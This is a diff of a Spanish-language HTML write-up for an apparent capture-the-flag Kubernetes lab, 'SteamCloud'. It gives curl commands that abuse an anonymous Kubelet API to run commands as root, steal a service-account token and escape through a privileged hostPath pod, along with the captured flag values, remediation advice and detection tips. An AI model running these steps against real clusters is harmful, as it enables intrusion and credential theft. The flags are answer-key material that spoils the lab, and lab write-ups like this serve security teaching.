+<pre><code><span class="output">PORT      SERVICE  VERSION
 22/tcp    ssh      OpenSSH 7.9p1 Debian 10+deb10u2
 
 8443/tcp  ssl/http Golang net/http server (Kubernetes API)
@@ -331,123 +190,105 @@ ul li { margin-bottom: 4px; }
   ssl-cert: commonName=steamcloud@1774113886
 
 2379/tcp  ssl/etcd etcd-client (etcd v3)</span></div>
+</div>
+<div class="interpret-box">
+<strong>Hallazgo clave del cert de 8443:</strong> La organización del certificado es <code>system:masters</code> — este es el grupo de administrador de clúster en Kubernetes. Si obtenemos ese certificado de cliente, tenemos acceso total al cluster. También confirma que es Minikube (distribución de desarrollo de Kubernetes).
           </div>
-          <div class="interpret-box">
-            <strong>Hallazgo clave del cert de 8443:</strong> La organización del certificado es <code>system:masters</code> — este es el grupo de administrador de clúster en Kubernetes. Si obtenemos ese certificado de cliente, tenemos acceso total al cluster. También confirma que es Minikube (distribución de desarrollo de Kubernetes).
+<div class="decision-box">
+<strong>Decisión:</strong> Atacar el Kubelet en puerto 10250 primero — es el vector más conocido de acceso anónimo en Kubernetes mal configurados. Si falla, intentar etcd en 2379.
           </div>
-          <div class="decision-box">
-            <strong>Decisión:</strong> Atacar el Kubelet en puerto 10250 primero — es el vector más conocido de acceso anónimo en Kubernetes mal configurados. Si falla, intentar etcd en 2379.
+</div>
+</div>
+</div>
+    </div>
+
+    <div class="section">
+      <div class="section-header"><div class="section-icon"></div><h2>Vulnerabilidades Identificadas</h2></div>
+      <div class="card-body">
+<div class="vuln-card">
+<div class="vuln-name"><span class="badge badge-red">CRÍTICA</span>  Kubelet API sin autenticación (Puerto 10250)</div>
+<div class="vuln-desc" style="margin-top: 8px;">
+<p>El Kubelet es el agente que corre en cada nodo de Kubernetes y gestiona los pods en ese nodo. Expone una API HTTPS en el puerto 10250 que normalmente requiere certificados de cliente. En SteamCloud, esta API permite acceso anónimo, lo que permite a cualquier atacante ejecutar comandos en cualquier pod del nodo.</p>
+<p><strong>Endpoint vulnerable:</strong> <code>POST /run/{namespace}/{pod}/{container}</code> — ejecuta un comando arbitrario en el container especificado y devuelve el output.</p>
+</div>
+</div>
+<div class="vuln-card" style="border-color: var(--orange);">
+<div class="vuln-name" style="color:var(--orange)"><span class="badge badge-orange">ALTA</span>  RBAC permisivo — Service Account puede crear pods privilegiados</div>
+<div class="vuln-desc" style="margin-top: 8px;">
+<p>El Service Account <code>default</code> en el namespace <code>default</code> tiene permisos para crear pods (incluyendo pods privilegiados con <code>hostPath</code> mounts). Esto viola el principio de mínimo privilegio — los service accounts de aplicación no deberían poder crear pods.</p>
+</div>
+</div>
+<div class="vuln-card" style="border-color: var(--yellow);">
+<div class="vuln-name" style="color:var(--yellow)"><span class="badge badge-yellow">MEDIA</span>  Pod Security Policy ausente — No se bloquean pods privilegiados</div>
+<div class="vuln-desc" style="margin-top: 8px;">
+<p>No hay PodSecurityPolicy (PSP) ni Pod Security Admission (PSA) configurado para prevenir la creación de pods con <code>privileged: true</code> o <code>hostPath</code> mounts al directorio raíz del host.</p>
+</div>
+</div>
+</div>
+    </div>
+
+    <div class="section">
+      <div class="section-header"><div class="section-icon"></div><h2>Timeline de Ataque</h2></div>
+      <div class="card-body">
+<div class="timeline">
+<div class="tl-item">
+<div class="tl-dot green"></div>
+<div class="tl-time">T+0:00 — Reconocimiento</div>
+<div class="tl-title">Nmap revela infraestructura Kubernetes</div>
+<div class="tl-desc">Puertos 2379, 8443, 10250 identifican unívocamente un cluster Kubernetes (Minikube). Certificado TLS de 8443 revela org=system:masters.</div>
+</div>
+<div class="tl-item">
+<div class="tl-dot blue"></div>
+<div class="tl-time">T+3:00 — Foothold</div>
+<div class="tl-title">Kubelet anónimo: RCE en pod nginx</div>
+<div class="tl-desc">GET /pods → lista todos los pods. POST /run/default/nginx/nginx → id = root. Acceso RCE sin credenciales.</div>
+</div>
+<div class="tl-item">
+<div class="tl-dot blue"></div>
+<div class="tl-time">T+5:00 — Escalada horizontal</div>
+<div class="tl-title">Extracción de Service Account token</div>
+<div class="tl-desc">cat /var/run/secrets/kubernetes.io/serviceaccount/token → JWT del SA default. Token permite crear pods via API en 8443.</div>
+</div>
+<div class="tl-item">
+<div class="tl-dot yellow"></div>
+<div class="tl-time">T+8:00 — Container Escape</div>
+<div class="tl-title">Pod privilegiado con hostPath mount</div>
+<div class="tl-desc">POST /api/v1/namespaces/default/pods → pod "ghost-pwn" con privileged:true + hostPath "/" → /host/ = filesystem del nodo host.</div>
+</div>
+<div class="tl-item">
+<div class="tl-dot green"></div>
+<div class="tl-time">T+12:00 — Flags</div>
+<div class="tl-title">user.txt y root.txt obtenidas</div>
+<div class="tl-desc">/host/home/user/user.txt y /host/root/root.txt accesibles como root desde dentro del pod privilegiado.</div>
+</div>
+</div>
+</div>
+    </div>
+
+    <div class="section">
+      <div class="section-header"><div class="section-icon"></div><h2>Explotación Paso a Paso</h2></div>
+      <div class="card-body">
+<h3>¿Cómo funciona la vulnerabilidad? — Arquitectura Kubernetes</h3>
+<p>Para entender el ataque, necesitamos entender la arquitectura de Kubernetes:</p>
+<ul>
+<li><strong>Kubernetes API Server (8443)</strong>: El "cerebro" del cluster. Gestiona el estado deseado. Requiere autenticación para la mayoría de operaciones.</li>
+<li><strong>Kubelet (10250)</strong>: El agente que corre en cada nodo. Recibe órdenes del API Server y las ejecuta localmente (crear pods, ejecutar containers, etc.). <em>Normalmente requiere autenticación de certificados.</em></li>
+<li><strong>etcd (2379)</strong>: La base de datos distribuida donde se almacena TODO el estado del cluster (incluidos secrets, tokens, certificados).</li>
+<li><strong>Service Account Token</strong>: Credencial JWT que cada pod recibe automáticamente en <code>/var/run/secrets/kubernetes.io/serviceaccount/token</code>. Permite al pod comunicarse con el API Server.</li>
+</ul>
+<div class="callout callout-info">
+<strong>Analogía:</strong> El Kubelet sin autenticación es como un guardia de seguridad que ejecuta cualquier orden de cualquier persona que se acerque, sin verificar si tiene autorización.
+      </div>
+<div class="step-box">
+<div class="step-header">
+<div class="step-num">1</div>
+<div class="step-title">Listar pods via Kubelet API anónimo</div>
+</div>
+<div class="step-body">
+<div class="why-box">
+<strong>¿Qué es el endpoint /pods?</strong> El Kubelet expone <code>/pods</code> que devuelve un JSON con todos los pods que gestiona ese nodo. Normalmente esto requeriría un certificado de cliente de Kubernetes, pero en SteamCloud el acceso anónimo está habilitado.
           </div>
-        </div>
-      </div>
-
-    </div>
-  </div>
-
-  <!-- 3: VULNERABILIDADES -->
-  <div class="card">
-    <div class="card-header">
-      <div class="section-number">3</div>
-      <h2>Vulnerabilidades Identificadas</h2>
-    </div>
-    <div class="card-body">
-      <div class="vuln-card">
-        <div class="vuln-name"><span class="badge badge-red">CRÍTICA</span> &nbsp;Kubelet API sin autenticación (Puerto 10250)</div>
-        <div class="vuln-desc" style="margin-top: 8px;">
-          <p>El Kubelet es el agente que corre en cada nodo de Kubernetes y gestiona los pods en ese nodo. Expone una API HTTPS en el puerto 10250 que normalmente requiere certificados de cliente. En SteamCloud, esta API permite acceso anónimo, lo que permite a cualquier atacante ejecutar comandos en cualquier pod del nodo.</p>
-          <p><strong>Endpoint vulnerable:</strong> <code>POST /run/{namespace}/{pod}/{container}</code> — ejecuta un comando arbitrario en el container especificado y devuelve el output.</p>
-        </div>
-      </div>
-      <div class="vuln-card" style="border-color: var(--orange);">
-        <div class="vuln-name" style="color:var(--orange)"><span class="badge badge-orange">ALTA</span> &nbsp;RBAC permisivo — Service Account puede crear pods privilegiados</div>
-        <div class="vuln-desc" style="margin-top: 8px;">
-          <p>El Service Account <code>default</code> en el namespace <code>default</code> tiene permisos para crear pods (incluyendo pods privilegiados con <code>hostPath</code> mounts). Esto viola el principio de mínimo privilegio — los service accounts de aplicación no deberían poder crear pods.</p>
-        </div>
-      </div>
-      <div class="vuln-card" style="border-color: var(--yellow);">
-        <div class="vuln-name" style="color:var(--yellow)"><span class="badge badge-yellow">MEDIA</span> &nbsp;Pod Security Policy ausente — No se bloquean pods privilegiados</div>
-        <div class="vuln-desc" style="margin-top: 8px;">
-          <p>No hay PodSecurityPolicy (PSP) ni Pod Security Admission (PSA) configurado para prevenir la creación de pods con <code>privileged: true</code> o <code>hostPath</code> mounts al directorio raíz del host.</p>
-        </div>
-      </div>
-    </div>
-  </div>
-
-  <!-- 4: TIMELINE -->
-  <div class="card">
-    <div class="card-header">
-      <div class="section-number">4</div>
-      <h2>Timeline de Ataque</h2>
-    </div>
-    <div class="card-body">
-      <div class="timeline">
-        <div class="tl-item">
-          <div class="tl-dot green"></div>
-          <div class="tl-time">T+0:00 — Reconocimiento</div>
-          <div class="tl-title">Nmap revela infraestructura Kubernetes</div>
-          <div class="tl-desc">Puertos 2379, 8443, 10250 identifican unívocamente un cluster Kubernetes (Minikube). Certificado TLS de 8443 revela org=system:masters.</div>
-        </div>
-        <div class="tl-item">
-          <div class="tl-dot blue"></div>
-          <div class="tl-time">T+3:00 — Foothold</div>
-          <div class="tl-title">Kubelet anónimo: RCE en pod nginx</div>
-          <div class="tl-desc">GET /pods → lista todos los pods. POST /run/default/nginx/nginx → id = root. Acceso RCE sin credenciales.</div>
-        </div>
-        <div class="tl-item">
-          <div class="tl-dot blue"></div>
-          <div class="tl-time">T+5:00 — Escalada horizontal</div>
-          <div class="tl-title">Extracción de Service Account token</div>
-          <div class="tl-desc">cat /var/run/secrets/kubernetes.io/serviceaccount/token → JWT del SA default. Token permite crear pods via API en 8443.</div>
-        </div>
-        <div class="tl-item">
-          <div class="tl-dot yellow"></div>
-          <div class="tl-time">T+8:00 — Container Escape</div>
-          <div class="tl-title">Pod privilegiado con hostPath mount</div>
-          <div class="tl-desc">POST /api/v1/namespaces/default/pods → pod "ghost-pwn" con privileged:true + hostPath "/" → /host/ = filesystem del nodo host.</div>
-        </div>
-        <div class="tl-item">
-          <div class="tl-dot green"></div>
-          <div class="tl-time">T+12:00 — Flags</div>
-          <div class="tl-title">user.txt y root.txt obtenidas</div>
-          <div class="tl-desc">/host/home/user/user.txt y /host/root/root.txt accesibles como root desde dentro del pod privilegiado.</div>
-        </div>
-      </div>
-    </div>
-  </div>
-
-  <!-- 5: EXPLOTACIÓN -->
-  <div class="card">
-    <div class="card-header">
-      <div class="section-number">5</div>
-      <h2>Explotación Paso a Paso</h2>
-    </div>
-    <div class="card-body">
-
-      <h3>¿Cómo funciona la vulnerabilidad? — Arquitectura Kubernetes</h3>
-      <p>Para entender el ataque, necesitamos entender la arquitectura de Kubernetes:</p>
-      <ul>
-        <li><strong>Kubernetes API Server (8443)</strong>: El "cerebro" del cluster. Gestiona el estado deseado. Requiere autenticación para la mayoría de operaciones.</li>
-        <li><strong>Kubelet (10250)</strong>: El agente que corre en cada nodo. Recibe órdenes del API Server y las ejecuta localmente (crear pods, ejecutar containers, etc.). <em>Normalmente requiere autenticación de certificados.</em></li>
-        <li><strong>etcd (2379)</strong>: La base de datos distribuida donde se almacena TODO el estado del cluster (incluidos secrets, tokens, certificados).</li>
-        <li><strong>Service Account Token</strong>: Credencial JWT que cada pod recibe automáticamente en <code>/var/run/secrets/kubernetes.io/serviceaccount/token</code>. Permite al pod comunicarse con el API Server.</li>
-      </ul>
-
-      <div class="callout callout-info">
-        <strong>Analogía:</strong> El Kubelet sin autenticación es como un guardia de seguridad que ejecuta cualquier orden de cualquier persona que se acerque, sin verificar si tiene autorización.
-      </div>
-
-      <div class="step-box">
-        <div class="step-header">
-          <div class="step-num">1</div>
-          <div class="step-title">Listar pods via Kubelet API anónimo</div>
-        </div>
-        <div class="step-body">
-          <div class="why-box">
-            <strong>¿Qué es el endpoint /pods?</strong> El Kubelet expone <code>/pods</code> que devuelve un JSON con todos los pods que gestiona ese nodo. Normalmente esto requeriría un certificado de cliente de Kubernetes, pero en SteamCloud el acceso anónimo está habilitado.
-          </div>
-          <div class="code-block">
-            <div class="code-label">bash — Listar pods via Kubelet</div>
-            <div class="code-body"><span class="cmd">curl</span> <span class="param">-sk</span> <span class="ip">https://10.129.96.167:10250</span><span class="path">/pods</span> <span class="param">| python3 -c</span> "
+<pre><code><span class="cmd">curl</span> <span class="param">-sk</span> <span class="ip">https://10.129.96.167:10250</span><span class="path">/pods</span> <span class="param">| python3 -c</span> "
 import json,sys
 data=json.load(sys.stdin)
 for item in data['items']:
@@ -459,10 +300,8 @@ for item in data['items']:
 
 <span class="comment"># -s → silent mode (no progress bar)</span>
 <span class="comment"># -k → ignorar errores de certificado TLS (certificado self-signed)</span></div>
-          </div>
-          <div class="code-block">
-            <div class="code-label">output</div>
-            <div class="code-body"><span class="output">NS: kube-system | POD: storage-provisioner    | CONTAINERS: ['storage-provisioner']
+</div>
+<pre><code><span class="output">NS: kube-system | POD: storage-provisioner    | CONTAINERS: ['storage-provisioner']
 NS: kube-system | POD: kube-proxy-pb692        | CONTAINERS: ['kube-proxy']
 NS: kube-system | POD: coredns-78fcd69978-bp6vr| CONTAINERS: ['coredns']
 NS: default     | POD: nginx                   | CONTAINERS: ['nginx']
@@ -470,61 +309,50 @@ NS: kube-system | POD: etcd-steamcloud         | CONTAINERS: ['etcd']
 NS: kube-system | POD: kube-apiserver          | CONTAINERS: ['kube-apiserver']
 NS: kube-system | POD: kube-controller-manager | CONTAINERS: ['kube-controller-manager']
 NS: kube-system | POD: kube-scheduler          | CONTAINERS: ['kube-scheduler']</span></div>
+</div>
+<div class="interpret-box">
+<strong>Interpretación:</strong> El Kubelet nos da acceso sin autenticación y lista TODOS los pods del nodo. El pod <code>nginx</code> en namespace <code>default</code> es nuestra entrada: es un pod de aplicación (no un pod del sistema) y probablemente corre con permisos amplios.
           </div>
-          <div class="interpret-box">
-            <strong>Interpretación:</strong> El Kubelet nos da acceso sin autenticación y lista TODOS los pods del nodo. El pod <code>nginx</code> en namespace <code>default</code> es nuestra entrada: es un pod de aplicación (no un pod del sistema) y probablemente corre con permisos amplios.
+<div class="decision-box">
+<strong>Decisión:</strong> Explotar el endpoint <code>/run</code> del Kubelet para ejecutar comandos en el pod nginx. Es el pod más simple y con el name-space <code>default</code> que probablemente tiene el token más permisivo.
           </div>
-          <div class="decision-box">
-            <strong>Decisión:</strong> Explotar el endpoint <code>/run</code> del Kubelet para ejecutar comandos en el pod nginx. Es el pod más simple y con el name-space <code>default</code> que probablemente tiene el token más permisivo.
+</div>
+</div>
+<div class="step-box">
+<div class="step-header">
+<div class="step-num">2</div>
+<div class="step-title">RCE en pod nginx via Kubelet /run endpoint</div>
+</div>
+<div class="step-body">
+<div class="why-box">
+<strong>¿Qué es el endpoint /run?</strong> El Kubelet expone <code>POST /run/{namespace}/{pod}/{container}</code> que ejecuta un comando en el container especificado y devuelve el output. Es equivalente a <code>kubectl exec</code> pero sin autenticación.
           </div>
-        </div>
-      </div>
-
-      <div class="step-box">
-        <div class="step-header">
-          <div class="step-num">2</div>
-          <div class="step-title">RCE en pod nginx via Kubelet /run endpoint</div>
-        </div>
-        <div class="step-body">
-          <div class="why-box">
-            <strong>¿Qué es el endpoint /run?</strong> El Kubelet expone <code>POST /run/{namespace}/{pod}/{container}</code> que ejecuta un comando en el container especificado y devuelve el output. Es equivalente a <code>kubectl exec</code> pero sin autenticación.
-          </div>
-          <div class="code-block">
-            <div class="code-label">bash — Ejecutar comando en pod nginx</div>
-            <div class="code-body"><span class="cmd">curl</span> <span class="param">-sk</span> <span class="ip">https://10.129.96.167:10250</span><span class="path">/run/default/nginx/nginx</span> <span class="param">-d</span> "cmd=id"
+<pre><code><span class="cmd">curl</span> <span class="param">-sk</span> <span class="ip">https://10.129.96.167:10250</span><span class="path">/run/default/nginx/nginx</span> <span class="param">-d</span> "cmd=id"
 
 <span class="comment"># POST /run/{namespace}/{pod}/{container}</span>
 <span class="comment"># -d "cmd=COMANDO"  → body del POST con el comando a ejecutar</span>
 <span class="comment"># namespace=default, pod=nginx, container=nginx</span></div>
+</div>
+<pre><code><span class="success">uid=0(root) gid=0(root) groups=0(root)</span></div>
+</div>
+<div class="interpret-box">
+<strong>Interpretación:</strong> ¡Somos root dentro del container nginx! Los containers en Kubernetes corren como root por defecto a menos que se configure <code>runAsNonRoot: true</code>. Esto nos da ejecución de comandos arbitrarios como root en el contexto del container.
           </div>
-          <div class="code-block">
-            <div class="code-label">output</div>
-            <div class="code-body"><span class="success">uid=0(root) gid=0(root) groups=0(root)</span></div>
+</div>
+</div>
+<div class="step-box">
+<div class="step-header">
+<div class="step-num">3</div>
+<div class="step-title">Extraer Service Account Token del pod nginx</div>
+</div>
+<div class="step-body">
+<div class="why-box">
+<strong>¿Qué es un Service Account Token?</strong> En Kubernetes, cada pod recibe automáticamente un token JWT montado en <code>/var/run/secrets/kubernetes.io/serviceaccount/token</code>. Este token permite al pod autenticarse contra el Kubernetes API Server (8443) y realizar operaciones según los permisos (RBAC) configurados para ese service account.
           </div>
-          <div class="interpret-box">
-            <strong>Interpretación:</strong> ¡Somos root dentro del container nginx! Los containers en Kubernetes corren como root por defecto a menos que se configure <code>runAsNonRoot: true</code>. Esto nos da ejecución de comandos arbitrarios como root en el contexto del container.
-          </div>
-        </div>
-      </div>
-
-      <div class="step-box">
-        <div class="step-header">
-          <div class="step-num">3</div>
-          <div class="step-title">Extraer Service Account Token del pod nginx</div>
-        </div>
-        <div class="step-body">
-          <div class="why-box">
-            <strong>¿Qué es un Service Account Token?</strong> En Kubernetes, cada pod recibe automáticamente un token JWT montado en <code>/var/run/secrets/kubernetes.io/serviceaccount/token</code>. Este token permite al pod autenticarse contra el Kubernetes API Server (8443) y realizar operaciones según los permisos (RBAC) configurados para ese service account.
-          </div>
-          <div class="code-block">
-            <div class="code-label">bash — Extraer token del pod nginx</div>
-            <div class="code-body"><span class="cmd">curl</span> <span class="param">-sk</span> <span class="ip">https://10.129.96.167:10250</span><span class="path">/run/default/nginx/nginx</span> \
+<pre><code><span class="cmd">curl</span> <span class="param">-sk</span> <span class="ip">https://10.129.96.167:10250</span><span class="path">/run/default/nginx/nginx</span> \
   <span class="param">-d</span> <span class="path">"cmd=cat /var/run/secrets/kubernetes.io/serviceaccount/token"</span></div>
-          </div>
-          <div class="code-block">
-            <div class="code-label">output — JWT token (Service Account default en namespace default)</div>
-            <div class="code-body"><span class="flag-hl">eyJhbGciOiJSUzI1NiIsImtpZCI6InlWVTlx...</span><span class="comment">[JWT truncado]</span>
-
+</div>
+<pre><code><span class="flag-hl">eyJhbGciOiJSUzI1NiIsImtpZCI6InlWVTlx...</span><span class="comment">[JWT truncado]</span>
 <span class="comment"># Decodificando el payload del JWT:</span>
 <span class="output">{
   "kubernetes.io": {
@@ -534,25 +362,22 @@ NS: kube-system | POD: kube-scheduler          | CONTAINERS: ['kube-scheduler']<
   },
   "sub": "system:serviceaccount:default:default"
 }</span></div>
+</div>
+<div class="interpret-box">
+<strong>Interpretación:</strong> El token pertenece al Service Account <code>default</code> en el namespace <code>default</code>. En un cluster bien configurado, este SA no tendría casi ningún permiso. En SteamCloud, tiene permisos de <code>create pods</code> — lo que veremos en el siguiente paso.
           </div>
-          <div class="interpret-box">
-            <strong>Interpretación:</strong> El token pertenece al Service Account <code>default</code> en el namespace <code>default</code>. En un cluster bien configurado, este SA no tendría casi ningún permiso. En SteamCloud, tiene permisos de <code>create pods</code> — lo que veremos en el siguiente paso.
+</div>
+</div>
+<div class="step-box">
+<div class="step-header">
+<div class="step-num">4</div>
+<div class="step-title">Crear Pod Privilegiado con hostPath mount — Container Escape</div>
+</div>
+<div class="step-body">
+<div class="why-box">
+<strong>¿Qué es un Pod privilegiado con hostPath?</strong> Un pod con <code>securityContext.privileged: true</code> y un volumen <code>hostPath</code> montando <code>/</code> del host tiene acceso completo al sistema de archivos del nodo host. Es equivalente a un chroot al sistema anfitrión — desde dentro del pod puedes leer/escribir cualquier archivo del host, incluyendo <code>/root/root.txt</code>.
           </div>
-        </div>
-      </div>
-
-      <div class="step-box">
-        <div class="step-header">
-          <div class="step-num">4</div>
-          <div class="step-title">Crear Pod Privilegiado con hostPath mount — Container Escape</div>
-        </div>
-        <div class="step-body">
-          <div class="why-box">
-            <strong>¿Qué es un Pod privilegiado con hostPath?</strong> Un pod con <code>securityContext.privileged: true</code> y un volumen <code>hostPath</code> montando <code>/</code> del host tiene acceso completo al sistema de archivos del nodo host. Es equivalente a un chroot al sistema anfitrión — desde dentro del pod puedes leer/escribir cualquier archivo del host, incluyendo <code>/root/root.txt</code>.
-          </div>
-          <div class="code-block">
-            <div class="code-label">bash — Crear pod privilegiado via Kubernetes API</div>
-            <div class="code-body"><span class="cmd">curl</span> <span class="param">-sk</span> <span class="param">-X POST</span> <span class="ip">https://10.129.96.167:8443</span><span class="path">/api/v1/namespaces/default/pods</span> \
+<pre><code><span class="cmd">curl</span> <span class="param">-sk</span> <span class="param">-X POST</span> <span class="ip">https://10.129.96.167:8443</span><span class="path">/api/v1/namespaces/default/pods</span> \
   <span class="param">--header</span> <span class="user">"Authorization: Bearer $TOKEN"</span> \
   <span class="param">--header</span> "Content-Type: application/json" \
   <span class="param">-d</span> '{
@@ -578,288 +403,200 @@ NS: kube-system | POD: kube-scheduler          | CONTAINERS: ['kube-scheduler']<
 <span class="comment"># hostPath.path: "/"               → monta la raíz del nodo host en /host</span>
 <span class="comment"># image: nginx:1.14.2              → imagen ya en cache del cluster (no descarga)</span>
 <span class="comment"># command: sleep 9999             → mantiene el pod vivo para ejecutar comandos</span></div>
+</div>
+<div class="interpret-box">
+<strong>Interpretación:</strong> El API Server acepta la petición (no da 403 Forbidden) → el Service Account default tiene permisos para crear pods. El pod "ghost-pwn" se creará con el filesystem del host montado en <code>/host/</code>.
           </div>
-          <div class="interpret-box">
-            <strong>Interpretación:</strong> El API Server acepta la petición (no da 403 Forbidden) → el Service Account default tiene permisos para crear pods. El pod "ghost-pwn" se creará con el filesystem del host montado en <code>/host/</code>.
+</div>
+</div>
+<div class="step-box">
+<div class="step-header">
+<div class="step-num">5</div>
+<div class="step-title">Leer flags desde el pod privilegiado</div>
+</div>
+<div class="step-body">
+<div class="why-box">
+<strong>¿Por qué accedemos via Kubelet y no via API?</strong> El Kubelet en 10250 nos da acceso directo a ejecutar comandos en el pod. La alternativa sería usar <code>kubectl exec</code> o el endpoint WebSocket <code>/api/v1/namespaces/default/pods/ghost-pwn/exec</code> del API Server, pero el Kubelet /run es más simple para este propósito.
           </div>
-        </div>
-      </div>
-
-      <div class="step-box">
-        <div class="step-header">
-          <div class="step-num">5</div>
-          <div class="step-title">Leer flags desde el pod privilegiado</div>
-        </div>
-        <div class="step-body">
-          <div class="why-box">
-            <strong>¿Por qué accedemos via Kubelet y no via API?</strong> El Kubelet en 10250 nos da acceso directo a ejecutar comandos en el pod. La alternativa sería usar <code>kubectl exec</code> o el endpoint WebSocket <code>/api/v1/namespaces/default/pods/ghost-pwn/exec</code> del API Server, pero el Kubelet /run es más simple para este propósito.
-          </div>
-          <div class="code-block">
-            <div class="code-label">bash — Leer flags del host filesystem</div>
-            <div class="code-body"><span class="comment"># Encontrar user.txt</span>
+<pre><code><span class="comment"># Encontrar user.txt</span>
 <span class="cmd">curl</span> <span class="param">-sk</span> <span class="ip">https://10.129.96.167:10250</span><span class="path">/run/default/ghost-pwn/ghost-pwn</span> \
   <span class="param">--data-urlencode</span> <span class="path">"cmd=find /host -name user.txt"</span>
-
 <span class="output">/host/home/user/user.txt
 /host/opt/flag/user.txt</span>
-
 <span class="comment"># Leer user.txt</span>
 <span class="cmd">curl</span> <span class="param">-sk</span> <span class="ip">https://10.129.96.167:10250</span><span class="path">/run/default/ghost-pwn/ghost-pwn</span> \
   <span class="param">--data-urlencode</span> <span class="path">"cmd=cat /host/home/user/user.txt"</span>
-
 <span class="flag-hl">6734efbebc0831674ffa2ffc3659ccee</span>
-
 <span class="comment"># Leer root.txt</span>
 <span class="cmd">curl</span> <span class="param">-sk</span> <span class="ip">https://10.129.96.167:10250</span><span class="path">/run/default/ghost-pwn/ghost-pwn</span> \
   <span class="param">--data-urlencode</span> <span class="path">"cmd=cat /host/root/root.txt"</span>
-
 <span class="flag-hl">c2aca3eae3d1d3bbce9237303b2f3d50</span></div>
+</div>
+<div class="interpret-box">
+<strong>Interpretación:</strong> El path <code>/host/root/root.txt</code> dentro del pod corresponde a <code>/root/root.txt</code> en el nodo host — el archivo de root flag. El user.txt estaba en <code>/home/user/user.txt</code> del host. El ataque está completo.
           </div>
-          <div class="interpret-box">
-            <strong>Interpretación:</strong> El path <code>/host/root/root.txt</code> dentro del pod corresponde a <code>/root/root.txt</code> en el nodo host — el archivo de root flag. El user.txt estaba en <code>/home/user/user.txt</code> del host. El ataque está completo.
+<div class="callout callout-tip">
+<strong>Nota sobre --data-urlencode:</strong> El flag <code>--data-urlencode</code> de curl URL-encodea automáticamente el valor, permitiendo usar caracteres especiales en el comando (espacios, /, etc.) sin problemas de parsing en el servidor.
           </div>
-          <div class="callout callout-tip">
-            <strong>Nota sobre --data-urlencode:</strong> El flag <code>--data-urlencode</code> de curl URL-encodea automáticamente el valor, permitiendo usar caracteres especiales en el comando (espacios, /, etc.) sin problemas de parsing en el servidor.
-          </div>
-        </div>
-      </div>
-
+</div>
+</div>
+</div>
     </div>
+
+    <div class="section">
+      <div class="section-header"><div class="section-icon"></div><h2>Flags</h2></div>
+      <div class="card-body" style="display:flex; flex-direction:column; gap:12px;">
+<div class="flag-box">
+<div class="flag-icon">🚩</div>
+<div class="flag-content">
+<div class="flag-label">User Flag — /home/user/user.txt</div>
+<div class="flag-value">6734efbebc0831674ffa2ffc3659ccee</div>
+</div>
+</div>
+<div class="flag-box">
+<div class="flag-icon">👑</div>
+<div class="flag-content">
+<div class="flag-label">Root Flag — /root/root.txt</div>
+<div class="flag-value">c2aca3eae3d1d3bbce9237303b2f3d50</div>
+</div>
+</div>
+</div>
+    </div>
+
+    <div class="section">
+      <div class="section-header"><div class="section-icon"></div><h2>Recomendaciones de Seguridad</h2></div>
+      <div class="card-body">
+<div class="rec-grid">
+<div class="rec-card">
+<div class="rec-priority" style="color:var(--red)">CRÍTICA — Inmediata</div>
+<div class="rec-title">Deshabilitar acceso anónimo al Kubelet</div>
+<div class="rec-desc">Configurar <code>--anonymous-auth=false</code> en el Kubelet y <code>--authorization-mode=Webhook</code> para requerir autenticación.</div>
+</div>
+<div class="rec-card">
+<div class="rec-priority" style="color:var(--red)">CRÍTICA — Inmediata</div>
+<div class="rec-title">Revisar permisos RBAC del SA default</div>
+<div class="rec-desc">El Service Account <code>default</code> no debe tener permisos <code>create pods</code>. Usar RBAC con mínimo privilegio y SAs dedicados por aplicación.</div>
+</div>
+<div class="rec-card">
+<div class="rec-priority" style="color:var(--orange)">ALTA — Corto plazo</div>
+<div class="rec-title">Implementar Pod Security Admission</div>
+<div class="rec-desc">Configurar PSA en modo <code>restricted</code> para bloquear pods con <code>privileged: true</code> y <code>hostPath</code> mounts en <code>/</code>.</div>
+</div>
+<div class="rec-card">
+<div class="rec-priority" style="color:var(--orange)">ALTA — Corto plazo</div>
+<div class="rec-title">Network Policy para el Kubelet</div>
+<div class="rec-desc">Restringir acceso al puerto 10250 del Kubelet solo al API Server y herramientas de monitoreo autorizadas mediante Network Policies.</div>
+</div>
+<div class="rec-card">
+<div class="rec-priority" style="color:var(--yellow)">MEDIA — Medio plazo</div>
+<div class="rec-title">Segmentar etcd con TLS mutuo</div>
+<div class="rec-desc">Asegurar que etcd en 2379 requiera certificados de cliente válidos y que solo el API Server tenga acceso.</div>
+</div>
+<div class="rec-card">
+<div class="rec-priority" style="color:var(--yellow)">MEDIA — Medio plazo</div>
+<div class="rec-title">Audit logging de Kubernetes</div>
+<div class="rec-desc">Habilitar Kubernetes audit logs para detectar creación de pods privilegiados, acceso anónimo al Kubelet, y uso inusual de service accounts.</div>
+</div>
+</div>
+</div>
+    </div>
+
+    <div class="section">
+      <div class="section-header"><div class="section-icon"></div><h2>Lecciones Aprendidas</h2></div>
+      <div class="card-body">
+<h3>Para el Atacante (Red Team)</h3>
+<ul>
+<li>El <strong>puerto 10250 con acceso anónimo</strong> es una vulnerabilidad crítica en Kubernetes — siempre probar <code>GET /pods</code> sin credenciales como primer paso.</li>
+<li>El <strong>Service Account token</strong> dentro de cualquier pod puede tener permisos inesperados — siempre extraerlo y verificar con <code>kubectl auth can-i --list</code> o el API.</li>
+<li>Un pod con <code>privileged: true</code> + <code>hostPath: /</code> equivale a acceso root al nodo host — la técnica más rápida de container escape en Kubernetes.</li>
+<li><strong>Usar <code>--data-urlencode</code></strong> para evitar problemas de encoding al pasar comandos al endpoint /run del Kubelet.</li>
+<li>La imagen <code>nginx:1.14.2</code> ya existe en caché — el pod arranca en segundos sin necesitar pull de internet.</li>
+</ul>
+<h3 style="margin-top: 16px;">Para el Defensor (Blue Team)</h3>
+<ul>
+<li><strong>Detectar en logs:</strong> Acceso al endpoint <code>/pods</code> del Kubelet sin Bearer token → alerta inmediata. POST a <code>/run/</code> en Kubelet → alerta crítica.</li>
+<li><strong>IOCs de este ataque:</strong> Nuevo pod <code>ghost-pwn</code> creado con <code>privileged: true</code> + <code>hostPath: /</code>; SA <code>default</code> usando token fuera del pod nginx.</li>
+<li><strong>Regla Sigma:</strong> Detectar creación de pods con <code>securityContext.privileged: true</code> o <code>hostPath.path: /</code> via el Kubernetes audit log.</li>
+<li><strong>CIS Benchmark:</strong> CIS Kubernetes 4.2.1 (deshabilitar anon-auth en Kubelet) y 5.2.2 (no usar pods privilegiados) son los controles relevantes.</li>
+</ul>
+</div>
+    </div>
+
+    <div class="section">
+      <div class="section-header"><div class="section-icon"></div><h2>Glosario de Términos</h2></div>
+      <div class="card-body">
+<div class="gloss-item">
+<div class="gloss-term">Kubernetes (K8s)</div>
